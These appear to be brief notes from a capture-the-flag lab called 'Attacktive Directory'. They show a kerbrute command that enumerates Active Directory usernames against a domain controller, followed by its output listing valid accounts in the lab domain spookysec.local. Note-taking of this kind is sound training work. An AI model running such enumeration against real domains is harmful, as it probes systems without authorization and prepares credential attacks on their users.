```
10.10.255.5 - Attacktive Direcory
```

> used kerbrute to enum users
	kerbrute enumusers --dc <ip> -d <domain> usernames.txt

> got a list of users
	2021/07/20 14:06:52 >  [+] VALID USERNAME:       james@spookysec.local
	2021/07/20 14:06:56 >  [+] VALID USERNAME:       svc-admin@spookysec.local
	2021/07/20 14:07:00 >  [+] VALID USERNAME:       James@spookysec.local
	2021/07/20 14:07:02 >  [+] VALID USERNAME:       robin@spookysec.local
	2021/07/20 14:07:29 >  [+] VALID USERNAME:       darkstar@spookysec.local
	2021/07/20 14:07:40 >  [+] VALID USERNAME:       administrator@spookysec.local
	2021/07/20 14:08:02 >  [+] VALID USERNAME:       backup@spookysec.local
	2021/07/20 14:08:12 >  [+] VALID USERNAME:       paradox@spookysec.local
	2021/07/20 14:09:46 >  [+] VALID USERNAME:       JAMES@spookysec.local
	2021/07/20 14:10:11 >  [+] VALID USERNAME:       Robin@spookysec.local
	2021/07/20 14:12:28 >  [+] VALID USERNAME:       Administrator@spookysec.local

>